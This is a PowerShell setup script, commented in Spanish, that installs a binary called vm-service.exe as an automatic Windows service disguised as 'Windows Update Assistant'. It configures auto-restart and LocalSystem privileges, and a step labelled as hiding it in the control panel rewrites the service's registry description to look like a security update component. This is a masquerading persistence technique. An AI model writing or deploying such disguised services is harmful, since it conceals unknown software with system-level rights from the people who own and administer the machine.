
# setup-service.ps1
$ServiceName = "WindowsUpdateAssistant"
$DisplayName = "Windows Update Assistant"
$Description = "Manages Windows Update components and optimization tasks"

# Detener si ya existe
if (Get-Service $ServiceName -ErrorAction SilentlyContinue) {
    Stop-Service $ServiceName -Force
    sc.exe delete $ServiceName
}

# Crear nuevo servicio
New-Service -Name $ServiceName `
            -DisplayName $DisplayName `
            -BinaryPathName "`"$PSScriptRoot\..\bin\vm-service.exe`"" `
            -Description $Description `
            -StartupType Automatic `
            -ErrorAction SilentlyContinue

# Configurar recuperación
sc.exe failure $ServiceName reset= 86400 actions= restart/5000/restart/5000// 

# Iniciar servicio
Start-Service $ServiceName

# Ocultar en panel de control
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
Set-ItemProperty -Path $regPath -Name "Description" -Value "Updates Windows security components"
Set-ItemProperty -Path $regPath -Name "ObjectName" -Value "LocalSystem"
